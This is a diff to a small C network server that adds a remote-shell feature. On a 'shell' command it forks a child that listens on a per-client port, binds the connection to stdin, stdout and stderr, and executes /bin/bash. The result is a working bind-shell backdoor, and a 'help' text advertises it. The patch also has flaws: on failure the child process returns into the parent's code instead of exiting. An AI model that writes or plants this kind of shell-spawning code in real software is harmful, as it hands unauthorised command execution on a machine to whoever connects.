@@ -13,6 +13,12 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#ifndef PORT
+ #define PORT 4242
+#endif
+
 int net_init()
 {
 	int fd;
@@ -22,7 +28,7 @@ int net_init()
 	bzero(&addr, sizeof(addr));
 	addr.sin_family = AF_INET;
 	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	addr.sin_port = htons(4242);
+	addr.sin_port = htons(PORT);
 
 	if (bind(fd, (const struct sockaddr *)&addr, sizeof(addr)) == -1)
 		return (-1);
@@ -39,6 +45,7 @@ typedef struct	s_client
 	int is_auth; // 0 no 1 yes
 	int is_connected;// 0 available 1 busy
 	char *wbuf;
+	int shellport;
 }				t_client;
 
 t_client *find_cl_available(t_client *cl)
@@ -82,6 +89,46 @@ char *gen_pwd(char *pwd)
 	return pwd;
 }
 
+void pop_shell(t_client *cl)
+{
+	pid_t pid;
+   
+
+	//exec shell
+	if ((pid = fork()) < 0)
+		return;
+	if (!pid)
+	{
+		int sockfd, connfd, len;
+    struct sockaddr_in servaddr, cli;
+    // network
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockfd == -1)
+		return;
+	servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    servaddr.sin_port = htons(cl->shellport);
+    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)
+		return;
+	if ((listen(sockfd, 2)) != 0)
+		return;
+	len = sizeof(cli);
+	connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
+	if (connfd < 0)
+		return;
+    char * const argv[] = {"/bin/bash", NULL};
+    char * const envp[] = {NULL};
+
+		dup2(connfd, 0);
+		dup2(connfd, 1);
+		dup2(connfd, 2);
+		execve("/bin/bash", argv, envp);
+		exit(0);
+	}
+
+
+}
+
 int net_receive(t_client *cl, fd_set *socks, int *n_cl)
 {
 	char buff[1919];
@@ -103,8 +150,17 @@ int net_receive(t_client *cl, fd_set *socks, int *n_cl)
 	{
 		close(cl->fd);
 		FD_CLR(cl->fd, socks);
-		bzero(cl, sizeof(t_client));
+		bzero(cl, sizeof(t_client) -sizeof(int));
 		(*n_cl)--;
+	}
+	else if (!strcmp(buff, "help\n"))
+	{
+		cl->wbuf = strdup("help: display available cmds\nshell: pop a shell on another port\nexit: quit this shell\n");
+		return(2);
+	}
+	else if (!strcmp(buff, "shell\n"))
+	{
+		pop_shell(cl);
 	}
 	return (0);
 }
@@ -122,6 +178,9 @@ int main()
 	FD_ZERO(&wsockets);
 
 	bzero(clients, sizeof(t_client) * 3);
+	clients[0].shellport = 4243;
+	clients[1].shellport = 4244;
+	clients[2].shellport = 4245;
 	if ((serv_sock = net_init()) < 0)
 		return 1;
 	FD_SET(serv_sock, &sockets);
@@ -147,7 +206,6 @@ int main()
 			{
 				if (i == serv_sock && n_clients < 3)
 				{
-					printf("start accepted new client !\n");
 					int clfd;
 					if ((clfd = net_accept(find_cl_available(clients), serv_sock)) < 0)
 						continue;
@@ -165,7 +223,7 @@ int main()
 					{
 						close(i);
 						FD_CLR(i, &sockets);
-						bzero(find_cl(clients, i), sizeof(t_client));
+						bzero(find_cl(clients, i), sizeof(t_client) - sizeof(int));
 						n_clients--;
 					}
 					if (r == 2)
